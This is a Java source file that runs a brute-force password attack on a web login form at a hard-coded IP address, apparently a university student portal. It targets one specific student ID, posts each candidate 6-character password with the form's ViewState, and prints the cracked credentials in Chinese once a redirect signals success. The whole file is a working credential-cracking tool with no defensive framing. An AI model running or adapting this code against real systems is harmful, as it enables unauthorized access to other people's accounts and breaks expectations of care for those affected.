package http;


import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class Test {
	private String urlIPAddress = "http://211.85.192.99";
	private URL url;
	private String realURLIPAddress;
	private URL realURL;
	private String userName;
	private String passWord;
	private int n = 1;
	
	public Test(String userName) {
		this.userName = userName;
		try {
			url = new URL(urlIPAddress);
			
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
	public void setUserName(String userName) {
		this.userName = userName;
	}
	
	public void setPassword(String passWord) {
		this.passWord = passWord;
	}
	
	private String getLocation() {
		String location;
		URLConnection urlConnection;
		HttpURLConnection httpURLConnection;
		try {
			urlConnection = url.openConnection();
			httpURLConnection = (HttpURLConnection)urlConnection;
			
			HttpURLConnection.setFollowRedirects(false);
			httpURLConnection.setRequestMethod("HEAD");
			httpURLConnection.setInstanceFollowRedirects(false);
			location = httpURLConnection.getHeaderField("Location");
		} catch (Exception ex) {
			ex.printStackTrace();
			return null;
		}
		
		return location;
	}
	
	public boolean postHtml() {
		URLConnection urlConnection;
		HttpURLConnection httpURLConnection;
		BufferedOutputStream out;
		realURLIPAddress = urlIPAddress + getLocation();
		String message;
		try {
			realURL = new URL(realURLIPAddress);
			urlConnection = realURL.openConnection();
			httpURLConnection = (HttpURLConnection)urlConnection;
			httpURLConnection.setDoInput(true);
			httpURLConnection.setDoOutput(true);
			httpURLConnection.setUseCaches(false);
			HttpURLConnection.setFollowRedirects(false);
			httpURLConnection.setRequestMethod("POST");
			httpURLConnection.setInstanceFollowRedirects(false);
			out = new BufferedOutputStream(urlConnection.getOutputStream());
			message = "__VIEWSTATE=dDwtMjEzNzcwMzMxNTs7Pu2UWJjb6pGYH56AYlt8eJ9VmE%2FQ" +
			"&TextBox1="+ userName + 
			"&TextBox2=" + passWord + 
			"&RadioButtonList1=%E5%AD%A6%E7%94%9F&Button1=";
			out.write(message.getBytes());
			out.flush();
			//返回的是禁止重定向后的message的Location值，若密码错误则返回null
			String reStr = httpURLConnection.getHeaderField("Location");
			if(reStr != null) {
				System.out.println("恭喜您，密码破解成功!");
				System.out.println("UserName:" +  this.userName);
				System.out.println("PassWord:" + this.passWord);
				return true;
			} else {
				//System.out.println("第" + n + "次尝试失败！\t失败的密码是:" + this.passWord);
				n++;
			}
		} catch (IOException e) {
			e.printStackTrace();
			return true;
		}
		return false;
	}

	//num表示密码位数
	public void trialCrack(int num) {
		PassWord word = new PassWord(num);
		while(word.hasNext()) {
			this.setPassword(word.next());
			if(this.postHtml()) {
				break;
			}
		}
	}
	
	public static void main(String[] args) throws Exception {
		new Test("090505103").trialCrack(6);
	}
}




















